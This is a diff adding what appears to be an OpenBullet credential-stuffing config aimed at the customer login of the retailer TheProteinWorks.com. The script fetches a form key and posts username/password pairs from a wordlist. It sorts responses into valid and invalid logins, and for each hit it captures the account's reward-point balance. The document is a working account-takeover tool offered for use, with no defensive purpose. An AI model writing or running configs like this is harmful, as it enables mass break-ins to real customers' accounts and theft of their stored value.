@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "TheProteinWorks.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-09T14:29:34.3038403+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.theproteinworks.com/customer/account/loginPost/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "formKey\":\"" "\"}" -> VAR "KEY" 
+
+REQUEST POST "https://www.theproteinworks.com/customer/account/loginPost/" 
+  CONTENT "form_key=<KEY>&login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>&send=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.theproteinworks.com" 
+  HEADER "referer: https://www.theproteinworks.com/securecheckout/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
+  HEADER "authority: www.theproteinworks.com" 
+  HEADER "method: POST" 
+  HEADER "path: /customer/account/loginPost/" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login or password" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+
+REQUEST GET "https://www.theproteinworks.com/rewardpoints/index/points/" 
+  
+  HEADER "referer: https://www.theproteinworks.com/customer/account/edit/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
+  HEADER "authority: www.theproteinworks.com" 
+  HEADER "method: GET" 
+  HEADER "path: /rewardpoints/index/points/" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" LR "=\"Your Points\">" "</td>" -> CAP "Points" 
+
